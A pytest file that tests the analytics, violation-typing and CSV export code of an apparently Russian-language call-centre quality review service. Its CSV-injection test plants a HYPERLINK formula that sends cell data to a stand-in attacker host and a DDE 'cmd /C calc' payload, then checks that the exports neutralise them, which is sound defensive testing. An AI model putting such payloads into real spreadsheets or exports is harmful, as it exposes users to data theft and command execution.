"""Analytics fixes, phase 2 (ANALYTICS-1..11): gross-violation typing and its negation guard, every critical criterion,
date and operator scopes, the near-miss register, the operator directory and the CSV registers.

In-memory SQLite (StaticPool) behind the real routers and the roles middleware; no network, no Claude, never api/data/cqa.db.
"""
from __future__ import annotations

import csv
import io
import json
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi import FastAPI, HTTPException
from fastapi.responses import JSONResponse
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool

from cqa.analytics import violations as violations_mod
from cqa.analytics.overview import scope_conversation_ids
from cqa.config import settings
from cqa.db import Base, get_db
from cqa.models import (
    Appeal,
    Checklist,
    ChecklistVersion,
    Conversation,
    Criterion,
    Evaluation,
    EvaluationCriterion,
    Turn,
)
from cqa.routers import analytics as analytics_router
from cqa.routers import appeals as appeals_router
from cqa.routers import export as export_router
from cqa.routers import insights as insights_router
from cqa.scoring.engine import CriterionInput, answer_points, compute_score
from cqa.security import middleware as security_mw

SEED = json.loads((Path(__file__).resolve().parents[1] / "seeds" / "checklist_freedom_v1.json").read_text(encoding="utf-8"))
ANSWERS = {"C1": "yes", "C2": "yes", "C3": "yes", "C4": 15, "C5": "yes", "C6": 7, "C7": "yes", "C8": "no"}
DONE = datetime(2026, 11, 7, 6, 0, tzinfo=UTC)  # 11:00 in Almaty (UTC+05:00)
ALINA, ALEXEY = "Алина", "Алексей"
FORMULA_START = ("=", "+", "-", "@", "\t", "\r")

# Real judge texts from the DEV run (0-based turn labels, as stored).
C8_NO = ("Грубые ошибки — Нет. Оператор не оскорблял клиента, не предлагал личных каналов или платных услуг в обход компании и не "
         "раскрывал данные счёта; тариф клиент назвал сам. Основание — реплики оператора [1], [3].")  # p1-ru-003
C8_PAID = ("Грубые ошибки — Да. Оператор попросил личный номер клиента, чтобы за плату дать частную консультацию в обход компании; "
           "отказ клиента флаг не снимает. Основание — реплика [3]: «Можете дать личный номер? Вечером за плату объясню.»")  # p1-ru-023
PAID_QUOTE = "Можете дать личный номер? Вечером за плату объясню."


# ------------------------------------------------------------------------------------------------ fixture

def _seed_checklist(db: Session) -> tuple[ChecklistVersion, list[Criterion]]:
    checklist = Checklist(name=SEED["name"], description=SEED["description"])
    db.add(checklist)
    db.flush()
    version = ChecklistVersion(checklist_id=checklist.id, version_no=1, is_active=True, change_note="v1",
                               scoring_rules=SEED["scoring_rules"], sections=SEED["sections"])
    db.add(version)
    db.flush()
    crits = []
    for i, c in enumerate(SEED["criteria"], start=1):
        crit = Criterion(checklist_version_id=version.id, code=c["code"], order=i, section=c["section"], title=c["title"],
                         instruction=c["instruction"], answer_type=c["answer_type"], options=c["options"], max_points=c["max_points"],
                         weight=c["weight"], na_allowed=c["na_allowed"], na_condition=c["na_condition"], is_critical=c["is_critical"],
                         critical_value=c.get("critical_value"), channel_overrides=c["channel_overrides"])
        db.add(crit)
        crits.append(crit)
    db.flush()
    return version, crits


def _conversation(db: Session, cid: str, operator: str | None, channel: str = "agent chat", language: str = "RU") -> None:
    turns = [("client", "00:00", "Здравствуйте, где посмотреть тариф?"),
             ("operator", "00:40", f"Здравствуйте! Меня зовут {operator or 'оператор'}. Сейчас подскажу."),
             ("client", "01:10", "Нет, не надо, это унизительно."),
             ("operator", "01:40", PAID_QUOTE)]
    db.add(Conversation(id=cid, channel=channel, language=language, operator_name=operator, turn_count=len(turns)))
    db.flush()
    for idx, (speaker, ts, text) in enumerate(turns):
        db.add(Turn(conversation_id=cid, idx=idx, timestamp_raw=ts, offset_seconds=float(idx * 20), speaker=speaker, text=text,
                    segment="operator" if idx else "pre"))
    db.flush()


def _evaluate(db: Session, cid: str, version: ChecklistVersion, crits: list[Criterion], answers: dict, *,
              c8_explanation: str | None = None, c8_flags: list[str] | None = None, c8_evidence: list[dict] | None = None) -> dict[str, int]:
    items = [CriterionInput(c.code, c.weight, c.max_points, answer_points(c.options, answers[c.code]), True, c.section, c.is_critical,
                            bool(c.is_critical and answers[c.code] == c.critical_value)) for c in crits]
    res = compute_score(version.scoring_rules, items, version.sections)
    ev = Evaluation(conversation_id=cid, checklist_version_id=version.id, status="completed", provider="anthropic",
                    model="claude-opus-5-5", total_score=res.total, final_total_score=res.total, critical_error=res.critical,
                    cost_usd=0.1, completed_at=DONE)
    db.add(ev)
    db.flush()
    rows = {"evaluation": ev.id}
    for c, item in zip(crits, items):
        cr = res.criteria[c.code]
        explanation, flags = f"{c.title} — обоснование. Основание — реплика [1].", []
        evidence = [{"turn_idx": 1, "speaker": "operator", "quote": "Сейчас подскажу.", "role": "supports"}]
        if c.code == "C8":
            explanation = c8_explanation or (C8_PAID if answers["C8"] == "yes" else C8_NO)
            flags = c8_flags if c8_flags is not None else (["paid_service_bypass", "personal_contact_request"] if answers["C8"] == "yes" else [])
            evidence = c8_evidence if c8_evidence is not None else [
                {"turn_idx": 3, "speaker": "operator", "quote": PAID_QUOTE, "role": "supports"},
                {"turn_idx": 2, "speaker": "client", "quote": "Нет, не надо, это унизительно.", "role": "context"}]
        row = EvaluationCriterion(evaluation_id=ev.id, criterion_id=c.id, code=c.code, applicable=True, answer=answers[c.code],
                                  score=item.points, max_points=c.max_points, weight=c.weight, weight_applied=cr.weight_applied,
                                  earned=cr.earned, confidence=0.9, explanation=explanation, flags=flags, evidence=evidence)
        db.add(row)
        db.flush()
        rows[c.code] = row.id
    return rows


def build_app(SessionFactory: sessionmaker) -> FastAPI:
    app = FastAPI()

    @app.exception_handler(HTTPException)  # same envelope as cqa.main
    async def http_exc(request, exc: HTTPException):
        detail = exc.detail if isinstance(exc.detail, dict) else {"code": "error", "message": str(exc.detail)}
        return JSONResponse(status_code=exc.status_code, content={"error": detail})

    for module in (appeals_router, insights_router, export_router, analytics_router):
        app.include_router(module.router)

    def override_get_db():
        db = SessionFactory()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = override_get_db
    security_mw.install(app, session_factory=SessionFactory)
    return app


@pytest.fixture
def env(monkeypatch):
    engine = create_engine("sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool)
    Base.metadata.create_all(engine)
    SessionFactory = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)
    with SessionFactory() as db:
        version, crits = _seed_checklist(db)
        _conversation(db, "own-001", ALINA)
        _conversation(db, "other-002", ALEXEY)
        _conversation(db, "gross-003", ALEXEY)
        ids = {"own": _evaluate(db, "own-001", version, crits, ANSWERS),
               "other": _evaluate(db, "other-002", version, crits, ANSWERS),
               "gross": _evaluate(db, "gross-003", version, crits, {**ANSWERS, "C8": "yes"}),
               "version_id": version.id, "checklist_id": version.checklist_id}
        db.commit()
    monkeypatch.setattr(settings, "anthropic_api_key", None)
    monkeypatch.setattr(security_mw, "_default_session_factory", lambda: (_ for _ in ()).throw(AssertionError("real DB")))
    app = build_app(SessionFactory)
    with TestClient(app) as client:
        yield SimpleNamespace(client=client, Session=SessionFactory, ids=ids)
    engine.dispose()


def H(role: str) -> dict[str, str]:
    return {"X-CQA-Role": role}


def _appeal(env, row_id: int, comment: str) -> dict:
    r = env.client.post("/api/appeals", json={"evaluation_criterion_id": row_id, "comment": comment}, headers=H("analyst"))
    assert r.status_code == 200, r.text
    return r.json()


def _decide(env, row_id: int, new_answer: str, reason: str = "Решение проверяющего по итогам прослушивания диалога целиком") -> dict:
    ap = _appeal(env, row_id, "Прошу перепроверить этот критерий: вывод модели вызывает сомнения")
    r = env.client.post(f"/api/appeals/{ap['id']}/decision", json={"action": "change", "new_answer": new_answer, "reason": reason,
                                                                   "add_to_fewshot": False}, headers=H("reviewer"))
    assert r.status_code == 200, r.text
    return ap


def _set_row(env, row_id: int, **fields) -> None:
    with env.Session() as db:
        row = db.get(EvaluationCriterion, row_id)
        for k, v in fields.items():
            setattr(row, k, v)
        db.commit()


def _items(env, **params) -> dict[str, dict]:
    return {i["conversation_id"]: i for i in env.client.get("/api/violations", params=params).json()["items"]}


def _csv_rows(response) -> list[list[str]]:
    assert response.status_code == 200, response.text
    return list(csv.reader(io.StringIO(response.content.decode("utf-8-sig"))))


# ------------------------------------------------------------------------------------------------ ANALYTICS-1: negation guard

@pytest.mark.parametrize("text,want", [
    # the judge's standard «Нет» phrasing: every type negated by its predicate, objects joined by «или» / «и» included
    (C8_NO, ["other"]),
    (("Грубые ошибки — Нет. Оператор отправил только приветствие, в нём нет оскорблений, предложения платных услуг в обход компании "
      "или раскрытия данных счёта."), ["other"]),  # p1-ru-025
    (("Грубые ошибки — Нет. Реплика «Всё есть в приложении» резкая и неинформативная, но не содержит оскорбления; предложений платных "
      "услуг или личных каналов нет, данные счёта не раскрывались."), ["other"]),  # p1-ru-026
    ("Грубые ошибки — Нет. Оскорблений клиента и предложений платных услуг в обход компании оператор не допустил.", ["other"]),  # p4-ru-003
    (("Грубые ошибки — Нет. Оператор клиента не оскорблял, личных каналов и платных услуг в обход компании не предлагал, сведений о "
      "счёте, ограничениях, остатках или заявках не раскрывал."), ["other"]),  # p4-ru-005
    (("Грубые ошибки — Нет. Оператор не оскорблял клиента, не предлагал платных услуг или личных каналов и не раскрывал данные счёта "
      "без идентификации, указав, что для проверки счёта нужна идентификация."), ["other"]),  # p1-ru-002: «без идентификации» negated
    ("Грубые ошибки — Нет. Оператор предложил бесплатную консультацию в приложении.", ["other"]),  # GV-06: «бесплатная» is not paid
    # Да verdicts that list the other types in negated form
    (("Грубые ошибки — Да. Оператор не оскорблял клиента и не предлагал платных услуг в обход компании, но раскрыл ограничение по "
      "счёту без подтверждённой идентификации."), ["disclosure"]),
    ("Грубые ошибки — Да. Оператор попросил личный номер для платной консультации; данные счёта без идентификации не раскрывал.",
     ["paid_bypass"]),
    (("Грубые ошибки — Да. Оператор не оскорблял клиента, не предлагал платных услуг или личных каналов и раскрыл ограничение по "
      "счёту без идентификации."), ["disclosure"]),
    ("Грубые ошибки — Да. Оператор раскрыл баланс без идентификации, оскорблений и предложений платных услуг не было.", ["disclosure"]),
    ("Грубые ошибки — Да. Оператор не проверил личность и раскрыл баланс.", ["disclosure"]),
    ("Грубые ошибки — Да. Оператор не оскорблял клиента, платную консультацию предложил сам.", ["paid_bypass"]),
    ("Грубые ошибки — Да. Оператор не помог клиенту и оскорбляет его.", ["insult"]),
    (("Gross errors — yes. The operator did not insult the client or offer paid services, but disclosed the balance without "
      "verification."), ["disclosure"]),
])
def test_negated_types_do_not_count(text, want):
    assert violations_mod.classify(text) == want


DEV_VIOLATIONS = [  # the 8 DEV gross violations: explanation, flags, operator quotes → type (docs/USER_STORIES.md GV-01)
    (("Грубые ошибки — Да. Оператор оскорбил клиента, обвинив его в неспособности читать. Основание — реплика [9] «Вы вообще читать "
      "умеете? Бот всё написал.»"), ["insult_detected", "client_complained_about_tone"], ["Вы вообще читать умеете? Бот всё написал."], "insult"),
    (("Грубые ошибки — Да. Оператор предложил клиенту перевести деньги ему лично для инвестирования в обход компании и подтвердил это "
      "после переспроса клиента. Основание — реплики [9] «Скиньте деньги мне на карту, я сам их вложу с выгодой» и [11] «через компанию "
      "оформлять не надо»."), ["off_company_service_offer", "personal_card_transfer_request", "antiscam_violation"],
     ["Скиньте деньги мне на карту, я сам их вложу с выгодой.", "Да, это я лично предлагаю, через компанию оформлять не надо."], "paid_bypass"),
    (C8_PAID, ["paid_service_bypass", "personal_contact_request"], [PAID_QUOTE], "paid_bypass"),
    (("Грубые ошибки — Да. Оператор попросил личный номер клиента, чтобы после работы платно объяснить, какие бумаги купить, то есть "
      "предложил платную консультацию в обход компании; отказ клиента флаг не снимает."),
     ["paid_private_consultation_offer", "personal_number_request", "client_declined"], [], "paid_bypass"),
    (("Грубые ошибки — Да. Оператор запросил личный номер клиента и предложил платную частную консультацию по выбору облигаций в обход "
      "компании; отказ клиента флаг не снимает. Основание — реплика [11]: «Send me your personal number and I'll call you after work. "
      "I charge for private advice and can tell you which bonds to buy.»"),
     ["off_platform_paid_service", "personal_contact_request", "channel_closed_by_operator_after_refusal"], [], "paid_bypass"),
    (("Грубые ошибки — Да. Оператор сообщил клиенту об ограничении на вывод по счёту без подтверждённой идентификации, а на замечание "
      "клиента ответил, что подтверждение не нужно. Основание — реплика [11] «на вашем счёте есть ограничение на вывод» и [13] "
      "«Подтверждение пока не нужно»."), ["confidential_disclosure_without_identification", "identity_not_confirmed"], [], "disclosure"),
    (("Грубые ошибки — Да. Оператор раскрыл ограничение на вывод по счёту клиента без подтверждённой идентификации и на замечание "
      "клиента ответил, что подтверждение не нужно."), ["confidential_disclosure_without_identification", "identity_not_confirmed"], [],
     "disclosure"),
    (("Грубые ошибки — Да. Оператор раскрыл ограничение на вывод по счёту без подтверждённой идентификации и на вопрос клиента о "
      "проверке ответил, что её можно пропустить."), ["confidential_disclosure_without_id", "identity_check_skipped",
                                                    "possible_factual_claim"], [], "disclosure"),
]


@pytest.mark.parametrize("explanation,flags,quotes,kind", DEV_VIOLATIONS)
def test_dev_violations_keep_their_single_type(explanation, flags, quotes, kind):
    assert violations_mod.classify(explanation, flags, quotes, "no" if kind == "disclosure" else None) == [kind]


def test_reviewer_flip_to_yes_is_not_typed_from_the_negative_explanation(env):
    _decide(env, env.ids["own"]["C8"], "yes", reason="Оператор нарушил правила, грубая ошибка подтверждена проверяющим")
    item = _items(env)["own-001"]
    assert item["ai_answer"] == "no" and item["final_answer"] == "yes" and item["overturned_by_reviewer"] is False
    assert item["types"] == ["other"] and item["classified_by"] == "default"  # needs manual typing, not «paid_bypass»
    body = env.client.get("/api/violations").json()
    assert body["counts"] == {"insult": 0, "paid_bypass": 1, "disclosure": 0, "other": 1}
    by_type = {t["code"]: t["count"] for t in env.client.get("/api/overview").json()["critical"]["by_type"]}
    assert by_type == {"insult": 0, "paid_bypass": 1, "disclosure": 0, "other": 1}
    # identification failed after review → the disclosure fallback, still not the AI's negated text
    _set_row(env, env.ids["own"]["C3"], answer="no")
    item = _items(env)["own-001"]
    assert item["types"] == ["disclosure"] and item["classified_by"] == "identification"


# ------------------------------------------------------------------------------------------------ ANALYTICS-2: flags, quotes, «rude»

def test_negated_flags_add_no_type():
    assert violations_mod.classify("Грубые ошибки — Да. Оператор предложил платную частную консультацию.",
                                   ["paid_private_consultation_offer", "curt_tone_not_insult"]) == ["paid_bypass"]
    assert violations_mod.classify("Грубые ошибки — Да. Оператор предложил платную частную консультацию.",
                                   ["no_account_data_disclosed", "rudeness_without_insult"]) == ["paid_bypass"]
    assert violations_mod.classify("Грубые ошибки — Да.", ["insult_detected"]) == ["insult"]
    assert violations_mod.classify("Грубые ошибки — Да. Нарушение.", ["confidential_disclosure_without_identification"]) == ["disclosure"]


def test_crude_is_not_rude():
    assert violations_mod.classify("Gross errors — yes. The operator offered a paid consultation on crude oil futures.",
                                   evidence_quotes=["I can tell you about crude oil for a fee."]) == ["paid_bypass"]
    assert violations_mod.classify("Gross errors — yes. The operator was rude to the client.") == ["insult"]


def test_client_quotes_do_not_type_the_violation(env):
    # gross-003's evidence holds the client's «Нет, не надо, это унизительно.» (context): the operator never insulted anyone
    item = _items(env)["gross-003"]
    assert item["types"] == ["paid_bypass"] and item["classified_by"] == "explanation"
    assert [e["speaker"] for e in item["evidence"]] == ["operator", "client"]
    _set_row(env, env.ids["gross"]["C8"], explanation="Грубые ошибки — Да. Нарушение.", flags=["curt_tone_not_insult"],
             evidence=[{"turn_idx": 2, "quote": "Нет, не надо, это унизительно.", "role": "context"}])  # speaker from the turn
    item = _items(env)["gross-003"]
    assert item["types"] == ["other"] and item["classified_by"] == "default"
    assert env.client.get("/api/violations", params={"type": "insult"}).json()["total"] == 0


# ------------------------------------------------------------------------------------------------ ANALYTICS-3: UTC offsets

@pytest.mark.parametrize("params,total", [
    ({"since": "2026-11-07T10:00:00+05:00"}, 1),  # 05:00 UTC, before the 06:00 UTC evaluation
    ({"since": "2026-11-07T05:00:00Z"}, 1),
    ({"since": "2026-11-07T11:30:00+05:00"}, 0),  # 06:30 UTC
    ({"until": "2026-11-07T10:30:00+05:00"}, 0),  # 05:30 UTC
    ({"until": "2026-11-07T11:30:00+05:00"}, 1),
    ({"until": "2026-11-07T06:30:00"}, 1),  # no offset: UTC, as stored
    ({"since": "2026-11-07T06:30:00"}, 0),
])
def test_since_until_respect_the_utc_offset(env, params, total):
    assert env.client.get("/api/violations", params=params).json()["total"] == total
    assert len(_csv_rows(env.client.get("/api/export/violations.csv", params=params))) - 1 == total


# ------------------------------------------------------------------------------------------------ ANALYTICS-4: every critical criterion

def _add_critical_c9(env, answers: dict[str, str]) -> dict[str, int]:
    """A second gross-error criterion C9 (is_critical, critical value "yes") on the version and a C9 row per evaluation."""
    out = {}
    with env.Session() as db:
        c8 = db.query(Criterion).filter_by(checklist_version_id=env.ids["version_id"], code="C8").one()
        c9 = Criterion(checklist_version_id=c8.checklist_version_id, code="C9", order=9, section=c8.section, title="Грубые ошибки (доп.)",
                       instruction=c8.instruction, answer_type="binary", options=c8.options, max_points=0, weight=0, na_allowed=False,
                       na_condition=None, is_critical=True, critical_value="yes", channel_overrides={})
        db.add(c9)
        db.flush()
        for key, answer in answers.items():
            ev = db.get(Evaluation, env.ids[key]["evaluation"])
            explanation = "Грубые ошибки (доп.) — Да. Оператор оскорбил клиента." if answer == "yes" else "Грубые ошибки (доп.) — Нет."
            row = EvaluationCriterion(evaluation_id=ev.id, criterion_id=c9.id, code="C9", applicable=True, answer=answer, score=0,
                                      max_points=0, weight=0, weight_applied=0, earned=0, confidence=0.9, explanation=explanation,
                                      evidence=[{"turn_idx": 1, "speaker": "operator", "quote": "Сейчас подскажу.", "role": "supports"}])
            db.add(row)
            db.flush()
            out[key] = row.id
            ev.critical_error = ev.critical_error or answer == "yes"
        db.commit()
    return out


def test_a_second_critical_criterion_feeds_the_register(env):
    _set_row(env, env.ids["own"]["C3"], answer="no")  # would make own-001 a near-miss candidate if it were not a violation
    _add_critical_c9(env, {"own": "yes", "other": "no", "gross": "no"})
    item = _items(env)["own-001"]
    assert item["criterion_code"] == "C9" and item["types"] == ["insult"] and item["evaluation_criterion_id"] != env.ids["own"]["C8"]
    ov = env.client.get("/api/overview").json()["critical"]
    assert ov["count"] == 2 and {t["code"]: t["count"] for t in ov["by_type"]}["insult"] == 1
    assert {r[0] for r in _csv_rows(env.client.get("/api/export/violations.csv"))[1:]} == {"own-001", "gross-003"}
    assert "own-001" not in {i["conversation_id"] for i in env.client.get("/api/violations/candidates").json()["items"]}


def test_a_standing_critical_criterion_is_not_shown_as_overturned(env):
    c9 = _add_critical_c9(env, {"own": "no", "other": "no", "gross": "yes"})
    _decide(env, env.ids["gross"]["C8"], "no", reason="Платной услуги не было: оператор пошутил, клиент это подтвердил")
    item = _items(env)["gross-003"]
    assert item["criterion_code"] == "C9" and item["evaluation_criterion_id"] == c9["gross"]
    assert item["overturned_by_reviewer"] is False and item["final_answer"] == "yes"


# ------------------------------------------------------------------------------------------------ ANALYTICS-5: register filters

def test_violations_register_takes_the_same_filters_as_the_api(env):
    for params, total in (({"dataset_id": 999}, 0), ({"since": "2099-01-01T00:00:00Z"}, 0), ({"until": "2099-01-01T00:00:00Z"}, 1)):
        assert env.client.get("/api/violations", params=params).json()["total"] == total
        assert len(_csv_rows(env.client.get("/api/export/violations.csv", params=params))) - 1 == total, params
    assert env.client.get("/api/export/violations.csv", params={"dataset_id": "abc"}).status_code == 422


def test_decisions_register_takes_the_same_filters_as_the_appeals_list(env):
    _appeal(env, env.ids["own"]["C7"], "Итог был в последней реплике оператора, прошу пересмотреть")
    _appeal(env, env.ids["gross"]["C4"], "Консультация была полной, балл занижен моделью")
    for params, total in (({}, 2), ({"language": "KZ"}, 0), ({"language": "ru"}, 2), ({"channel": "voice call"}, 0),
                          ({"channel": "agent chat"}, 2), ({"conversation_id": "own-001"}, 1), ({"conversation_id": "nope"}, 0),
                          ({"q": "ИТОГ"}, 1), ({"q": "gross-003"}, 1), ({"q": ALEXEY}, 1), ({"q": "  "}, 2)):
        rows = _csv_rows(env.client.get("/api/export/decisions.csv", params=params))[1:]
        assert len(rows) == total, params
        assert len(env.client.get("/api/appeals", params=params).json()) == total, params


# ------------------------------------------------------------------------------------------------ ANALYTICS-6: CSV injection

def test_registers_neutralise_formula_cells(env):
    """Whatever people typed is stored as is; the registers make every formula-like text cell inert."""
    payload = '=HYPERLINK("https://evil.example/?q="&A2,"Подробнее")'
    ap = _decide(env, env.ids["own"]["C7"], "no")
    other = _appeal(env, env.ids["other"]["C7"], "Итог был, оператор попрощался в последней реплике")
    with env.Session() as db:
        decided = db.get(Appeal, ap["id"])
        decided.comment, decided.author_name = payload, "+Аноним"
        decided.decision.reason = "\tИтога в последней реплике действительно нет"
        decided.decision.reviewer_label = "\rПроверяющий"
        db.get(Appeal, other["id"]).comment = "- итог был, оператор попрощался в последней реплике"
        db.get(Conversation, "gross-003").operator_name = "@SUM(1+1)*cmd|' /C calc'!A0"
        db.commit()
    _set_row(env, env.ids["gross"]["C8"], evidence=[{"turn_idx": 3, "speaker": "operator", "quote": "+7 701 000 00 00 звоните", "role": "supports"}])
    decisions = _csv_rows(env.client.get("/api/export/decisions.csv"))
    rows = {row[0]: dict(zip(decisions[0], row)) for row in decisions[1:]}
    own = rows[str(ap["id"])]
    assert own["comment"] == "'" + payload and own["author"] == "'+Аноним"
    assert own["reason"] == "'\tИтога в последней реплике действительно нет" and own["reviewer"] == "'\rПроверяющий"
    assert rows[str(other["id"])]["comment"] == "'- итог был, оператор попрощался в последней реплике"
    assert own["evaluation_id"].isdigit() and own["final_total_score"][0].isdigit()  # numbers stay numbers
    vio = _csv_rows(env.client.get("/api/export/violations.csv"))
    gross = dict(zip(vio[0], vio[1]))
    assert gross["operator_name"] == "'@SUM(1+1)*cmd|' /C calc'!A0" and gross["quote"] == "'+7 701 000 00 00 звоните"
    assert gross["turn"] == "4" and gross["confidence"] == "0.90"
    for table in (decisions, vio):
        assert not [cell for row in table for cell in row if cell.startswith(FORMULA_START)]


# ------------------------------------------------------------------------------------------------ ANALYTICS-7: reasons as typed

def test_decisions_register_keeps_the_reviewers_reason_as_typed(env):
    ap = _appeal(env, env.ids["own"]["C7"], "В реплике [3] оператор подвёл итог, прошу пересмотреть")
    reason = "В реплике [3] итога нет, только благодарность"
    r = env.client.post(f"/api/appeals/{ap['id']}/decision", json={"action": "change", "new_answer": "no", "reason": reason,
                                                                   "add_to_fewshot": False}, headers=H("reviewer"))
    assert r.status_code == 200, r.text
    rows = _csv_rows(env.client.get("/api/export/decisions.csv"))
    row = dict(zip(rows[0], rows[1]))
    assert row["reason"] == reason and row["comment"] == "В реплике [3] оператор подвёл итог, прошу пересмотреть"
    # the judge's explanation is still shown 1-based in the violations register
    vio = _csv_rows(env.client.get("/api/export/violations.csv"))
    assert "реплика [4]" in dict(zip(vio[0], vio[1]))["explanation"]


# ------------------------------------------------------------------------------------------------ ANALYTICS-8: operator «—»

def test_unnamed_operator_scope_matches_the_operator_directory(env):
    with env.Session() as db:
        version = db.get(ChecklistVersion, env.ids["version_id"])
        crits = sorted(version.criteria, key=lambda c: c.order)
        _conversation(db, "anon-004", None)
        _conversation(db, "blank-005", "  ")
        anon = _evaluate(db, "anon-004", version, crits, {**ANSWERS, "C8": "yes"})
        _evaluate(db, "blank-005", version, crits, ANSWERS)
        db.commit()
        assert scope_conversation_ids(db, operator="—") == {"anon-004", "blank-005"}
        assert scope_conversation_ids(db, operator=ALEXEY) == {"other-002", "gross-003"}
    listed = next(o for o in env.client.get("/api/operators").json() if o["operator_name"] == "—")
    assert listed["conversations"] == 1 and listed["critical_count"] == 1
    ov = env.client.get("/api/overview", params={"operator": "—"}).json()
    assert ov["coverage"]["conversations"] == 2 and ov["coverage"]["evaluated"] == 2 and ov["critical"]["count"] == 1
    assert {t["code"]: t["count"] for t in ov["critical"]["by_type"]}["paid_bypass"] == 1
    assert env.client.get("/api/analytics/summary", params={"operator": "—"}).json()["count"] == 2
    vio = env.client.get("/api/violations", params={"operator": "—"}).json()
    assert [i["conversation_id"] for i in vio["items"]] == ["anon-004"] and vio["items"][0]["evaluation_criterion_id"] == anon["C8"]
    assert len(_csv_rows(env.client.get("/api/export/violations.csv", params={"operator": "—"}))) == 2
    # named operators are unchanged
    assert [i["conversation_id"] for i in env.client.get("/api/violations", params={"operator": ALEXEY}).json()["items"]] == ["gross-003"]
    assert env.client.get("/api/overview", params={"operator": ALINA}).json()["coverage"]["conversations"] == 1


# ------------------------------------------------------------------------------------------------ ANALYTICS-9: open appeals per version

def test_operator_open_appeals_follow_the_checklist_version(env):
    with env.Session() as db:
        v2 = ChecklistVersion(checklist_id=env.ids["checklist_id"], version_no=2, is_active=False, change_note="v2",
                              scoring_rules=SEED["scoring_rules"], sections=SEED["sections"])
        db.add(v2)
        db.commit()
        v2_id = v2.id
    _appeal(env, env.ids["own"]["C7"], "Итог был в последней реплике оператора, прошу пересмотреть")

    def open_appeals(**params):
        return {o["operator_name"]: o["open_appeals"] for o in env.client.get("/api/operators", params=params).json()}[ALINA]

    assert open_appeals() == 1 and open_appeals(checklist_version_id=env.ids["version_id"]) == 1
    assert open_appeals(checklist_version_id=v2_id) == 0
    assert env.client.get("/api/overview", params={"checklist_version_id": v2_id}).json()["appeals"]["open"] == 0


# ------------------------------------------------------------------------------------------------ ANALYTICS-10: reviewer-final C3

def test_identification_fallback_follows_the_reviewers_c3(env):
    _set_row(env, env.ids["gross"]["C8"], explanation="Грубые ошибки — Да. Нарушение правил. Основание — реплика [3].", flags=[],
             evidence=[{"turn_idx": 3, "speaker": "operator", "quote": "Подождите минуту.", "role": "supports"}])
    _set_row(env, env.ids["gross"]["C3"], answer="no")
    item = _items(env)["gross-003"]
    assert item["types"] == ["disclosure"] and item["classified_by"] == "identification" and item["related"] == {"C3": {"answer": "no"}}
    _decide(env, env.ids["gross"]["C3"], "yes", reason="Идентификация пройдена по SMS-коду до любых данных счёта")
    item = _items(env)["gross-003"]
    assert item["related"] == {"C3": {"answer": "yes"}}
    assert item["types"] == ["other"] and item["classified_by"] == "default"
    assert env.client.get("/api/violations", params={"type": "disclosure"}).json()["total"] == 0
    assert env.client.get("/api/violations").json()["counts"]["other"] == 1


# ------------------------------------------------------------------------------------------------ ANALYTICS-11: errored C8 is not cleared

def test_errored_gross_error_row_is_not_listed_as_cleared(env):
    _set_row(env, env.ids["other"]["C3"], answer="no")
    _set_row(env, env.ids["other"]["C8"], answer=None, score=None, confidence=None, explanation="Ошибка оценки: timeout", flags=["error"],
             evidence=[])
    body = env.client.get("/api/violations/candidates").json()
    assert "other-002" not in {i["conversation_id"] for i in body["items"]}
    assert "other-002" not in _items(env)
    _set_row(env, env.ids["other"]["C8"], final_answer="no", review_state="changed")  # a reviewer checked it: listed again
    item = next(i for i in env.client.get("/api/violations/candidates").json()["items"] if i["conversation_id"] == "other-002")
    assert item["final_answer"] == "no" and item["signals"] == ["identification_failed"]
